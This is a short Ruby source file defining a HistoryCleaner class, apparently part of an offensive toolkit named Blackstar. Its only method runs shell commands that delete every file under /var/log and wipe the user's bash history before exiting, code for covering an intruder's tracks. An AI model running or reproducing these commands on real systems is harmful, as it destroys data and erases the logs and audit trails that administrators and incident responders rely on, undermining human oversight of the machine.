module Blackstar
  class HistoryCleaner
    def clean
      Cmd.call('find /var/log -type f -delete')
      Cmd.call('cat /dev/null > ~/.bash_history && history -c && exit')
    end
  end
end